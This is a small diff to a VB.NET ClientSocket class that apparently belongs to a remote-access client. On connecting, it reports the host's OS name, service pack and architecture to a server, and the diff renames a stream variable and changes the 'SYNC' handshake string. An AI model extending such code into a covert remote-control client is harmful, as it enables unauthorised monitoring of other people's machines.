@@ -35,7 +35,7 @@ Public Class ClientSocket
             MS = New MemoryStream
 
             Dim OS As New Devices.ComputerInfo
-            Send(String.Concat("INFO", SPL, "SYNC", SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))
+            Send(String.Concat("INFO", SPL, "SYNC SOCKET", SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))
 
             Read()
 
@@ -125,20 +125,20 @@ re:
     End Sub
 
     Private Shared Sub Send(ByVal b As Byte())
-        Dim M As MemoryStream = New IO.MemoryStream
+        Dim MS As MemoryStream = New MemoryStream
         Try
-            M.Write(b, 0, b.Length)
-            M.Write(SB(EOF), 0, EOF.Length)
+            MS.Write(b, 0, b.Length)
+            MS.Write(SB(EOF), 0, EOF.Length)
 
             SyncLock S
                 S.Poll(-1, SelectMode.SelectWrite)
-                S.Send(M.ToArray, 0, M.Length, SocketFlags.None)
+                S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
             End SyncLock
 
-            M.Dispose()
+            MS.Dispose()
         Catch ex As Exception
             isConnected = False
-            M.Dispose()
+            MS.Dispose()
         End Try
     End Sub
 
